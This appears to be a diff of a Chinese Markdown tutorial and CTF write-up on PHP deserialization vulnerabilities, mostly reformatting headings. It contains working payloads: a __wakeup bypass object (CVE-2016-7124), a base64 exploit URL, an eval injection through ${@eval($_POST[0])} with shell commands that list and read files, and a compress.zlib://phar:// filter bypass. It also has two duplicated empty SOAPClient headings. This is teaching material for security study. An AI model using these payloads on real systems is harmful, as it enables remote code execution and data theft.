@@ -1,7 +1,7 @@
-### 1、什么是序列化
+# **1 什么是序列化**
 序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击
 
-### 2、序列化相关函数
+# **2 序列化相关函数**
 serialize、unserialize，以及在序列化和反序列化过程中自动执行的魔术方法，具体有：
 
 ```php
@@ -40,7 +40,7 @@ unserialize() 会检查是否存在一个 \__wakeup() 方法。如果存在，�
 ```
 比如只想返回对象的info属性
 
-### 3、 简单案例
+# **3 简单案例**
 ```php
 <?php
 class SerializeTest
@@ -61,18 +61,17 @@ echo $temp . '<br>';
 $me = unserialize($temp);
 ```
 输出：
+```js
 O:13:"SerializeTest":2:{s:19:" SerializeTest flag";s:20:"flag{th15_tru3_f1a9}";s:19:" SerializeTest file";s:8:"test.php";}
 
-O: 代表对象  13代表对象所属类的字符表示
-
+O: 代表对象
+13代表对象所属类的字符长度表示
 :2: 代表具有两个序列化的属性，分别是SerializeTest flag和SerializeTest file，后面的内容对应的是值
+```
+# **4 常见利用方式总结**
 
-### 4、题目实战
-
-#### 4.1 绕过\__wakeup()方法
-
-第一步和第二步都比较简单的可以绕过
-关键是第三步，看关键的代码
+## **4.1 绕过\__wakeup()方法**
+看关键的代码：
 ```php
 <?php 
 class Demo { 
@@ -103,14 +102,15 @@ if (isset($_GET['var'])) { 
 ```
 第一步是要绕过正则表达式的判断，preg_match('/[oc]:\d+:/i', $var)，这里绕过正则的方式是在O的后面的加上+号
 
-比如形如这样的序列化：O:+6:"sercet":1:{s:12:" sercet file";s:12:"the_next.php";}
-
-第二是要绕过\__wakeup()对$file对象的赋值
-
-问题是如何绕过\__weakup 百度一下  发现这是一个CVE漏洞 ==》当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)
-
-类似这样的payload：O:+6:"sercet":2:{s:12:" sercet file";s:12:"the_next.php";}
-
+比如形如这样的序列化：
+```js
+O:+6:"sercet":1:{s:12:" sercet file";s:12:"the_next.php";}
+```
+第二是要绕过\__wakeup()对$file对象的赋值，问题是如何绕过\__weakup 百度一下  发现这是一个CVE漏洞 ==》当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)
+类似这样的payload：
+```js
+O:+6:"sercet":2:{s:12:" sercet file";s:12:"the_next.php";}
+```
 ***所以构造payload:***
 ```php
 $demo = new Demo('f15g_1s_here.php');
@@ -118,12 +118,9 @@ $va = serialize($demo);
 $a1 = str_replace('O:4', 'O:+4', $va);
 $a1 = str_replace(':1:', ':7:', $a1);
 echo base64_encode($a1);
-
-O:+4:"Demo":2:{S:10:"\00Demo\00file";s:16:"f15g_1s_here.php";}
+输出：O:+4:"Demo":2:{S:10:"\00Demo\00file";s:16:"f15g_1s_here.php";}
 ```
-/Gu3ss_m3_h2h2.php?var=TzorNDoiRGVtbyI6Nzp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==
-
-得到f15g_1s_here.php的代码：
+然后访问/Gu3ss_m3_h2h2.php?var=TzorNDoiRGVtbyI6Nzp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==，得到f15g_1s_here.php的代码：
 ```php
 <?php 
 if (isset($_GET['val'])) { 
@@ -133,18 +130,13 @@ if (isset($_GET['val'])) { 
     die('hahaha!'); 
 } 
 ?>
-```
-http://7fd6cef3296344adb135503e375b83210f41ea6ac1df44e8.game.ichunqiu.com//f15g_1s_here.php?val=${@eval($_POST[0])}
-
+访问：http://7fd6cef3296344adb135503e375b83210f41ea6ac1df44e8.game.ichunqiu.com//f15g_1s_here.php?val=${@eval($_POST[0])}
 POST请求：0=echo \`ls\`;
-
 Gu3ss_m3_h2h2.php True_F1ag_i3_Here_233.php f15g_1s_here.php index.php
-
 执行：
 0=echo \`cat True_F1ag_i3_Here_233.php\`;
-
-#### 4.2 session反序列化漏洞
-
+```
+## 4.2 **session反序列化利用**
 首先我们需要了解session反序列化是什么？
 PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化
 在php.ini中有以下配置项，wamp的默认配置如图
@@ -193,14 +185,12 @@ php中的session中的内容并不是放在内存中的，而是以文件的方�
 
 序列化引擎 | 	对应的存储形式
 -|-|
-php	| name|s:6:"hahaha"；其中name是键值，s:6:"hahaha";是serialize("hahaha")的结果
-php_binary 	| names:6:"hahaha"；由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是names:6:"hahaha";（ASCII的值为4的字符无法在网页上面显示）
-php_serialize	| SESSION文件的内容是a:1:{s:4:"name";s:6:"hahaha";}。a:1是使用php_serialize进行序列化时都会加上，表示只有一个键值对。同时使用php_serialize会将session中的key和value都会进行序列化。
+php	| name|s\:6\:"hahaha"；其中name是键值，s\:6\:"hahaha";是serialize("hahaha")的结果
+php_binary 	| names\:6\:"hahaha"；由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是names\:6\:"hahaha";（ASCII的值为4的字符无法在网页上面显示）
+php_serialize	| SESSION文件的内容是a\:1\:{s\:4\:"name";s\:6\:"hahaha";}。a\:1是使用php_serialize进行序列化时都会加上，表示只有一个键值对。同时使用php_serialize会将session中的key和value都会进行序列化。
 
 **Session 反序列化利用点:**
-PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法
-
-假设存在s1.php和s2.php，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞、s1.php，使用php_serialize来处理session
+PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法，假设存在s1.php和s2.php，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞、s1.php，使用php_serialize来处理session
 ```php
 1	<?php
 2	ini_set('session.serialize_handler', 'php_serialize');
@@ -232,7 +222,7 @@ us2.php,使用php来处理session
 * https://www.anquanke.com/post/id/164569
 * 安恒杯-Session反序列化
 
-#### 4.3 phar伪协议反序列化
+## **4.3 phar伪协议反序列化**
 利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。
 
 **phar文件结构**
@@ -291,13 +281,15 @@ file_exists($filename);
 结果输出：oh oh oh !!! 说明成功进行了反序列化
 
 有时候对传入的参数进行了一些过滤，把 phar:// 开头的直接 过滤了，也就是我要求你要用另外的反序列化的方式，这种方式不能使用 phar:// 开头，我们可以使用的是 compress.zlib://phar://xxxx 这种方式进行绕过过滤
+## **4.4 利用SOAPClient反序列化SSRF利用**
+
+## **4.5 利用SOAPClient反序列化SSRF利用**
 
 **相关的CTF题**
 
 * LCTF-2018 T4lk 1s ch34p,sh0w m3 the sh31l
 * https://paper.seebug.org/680/
 * http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/
-
-参考文献
+# **5 参考文献**
 
 【1】https://blog.spoock.com/2016/10/16/php-serialize-problem/
